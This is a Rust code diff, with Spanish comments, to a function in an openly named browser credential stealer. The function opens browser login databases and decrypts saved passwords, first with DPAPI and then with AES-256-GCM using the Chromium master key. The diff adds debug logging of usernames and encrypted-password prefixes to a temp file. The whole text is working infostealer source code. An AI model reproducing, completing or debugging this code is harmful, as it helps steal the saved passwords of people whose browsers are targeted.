@@ -207,6 +207,17 @@ fn extract_credentials_from_db(
     browser_name: &str,
     master_key: Option<&[u8]>,
 ) -> StealerResult<Vec<Credential>> {
+    // Debug file para ver detalles del decrypt
+    use std::fs::OpenOptions;
+    use std::io::Write;
+    let temp_dir = std::env::temp_dir();
+    let debug_path = temp_dir.join("stealer_debug.txt");
+    let mut debug = OpenOptions::new()
+        .create(true)
+        .append(true)
+        .open(debug_path)
+        .unwrap();
+    
     let conn = Connection::open(db_path)
         .map_err(|e| StealerError::DatabaseError(e.to_string()))?;
     
@@ -229,16 +240,34 @@ fn extract_credentials_from_db(
                 continue;
             }
             
+            // 🔍 DEBUG: Ver el formato del password encriptado
+            writeln!(debug, "    🔍 Password para {}: {} bytes", username, encrypted_pwd.len()).ok();
+            if encrypted_pwd.len() >= 3 {
+                let prefix = &encrypted_pwd[0..3];
+                writeln!(debug, "       Prefix: {:02X} {:02X} {:02X} ({})", 
+                    prefix[0], prefix[1], prefix[2], 
+                    String::from_utf8_lossy(prefix)).ok();
+            }
+            
             // Intentar desencriptar el password
             // IMPORTANTE: Primero DPAPI (passwords viejos), luego AES-GCM (passwords nuevos)
             let password = if let Ok(pwd) = decrypt_dpapi_fallback(&encrypted_pwd) {
                 // DPAPI v1 (Chrome antiguo, pre-v80)
+                writeln!(debug, "       ✅ DPAPI OK").ok();
                 pwd
             } else if let Some(key) = master_key {
                 // AES-256-GCM (Chromium moderno v80+: v10/v11/v20)
-                decrypt_aes_gcm(&encrypted_pwd, key).unwrap_or_else(|_| "[decrypt failed]".to_string())
+                writeln!(debug, "       ⚠️ DPAPI falló, intentando AES-GCM...").ok();
+                let result = decrypt_aes_gcm(&encrypted_pwd, key);
+                if result.is_ok() {
+                    writeln!(debug, "       ✅ AES-GCM OK").ok();
+                } else {
+                    writeln!(debug, "       ❌ AES-GCM FALLÓ").ok();
+                }
+                result.unwrap_or_else(|_| "[decrypt failed]".to_string())
             } else {
                 // Sin master key y DPAPI falló
+                writeln!(debug, "       ❌ No master key disponible").ok();
                 "[no key]".to_string()
             };
             
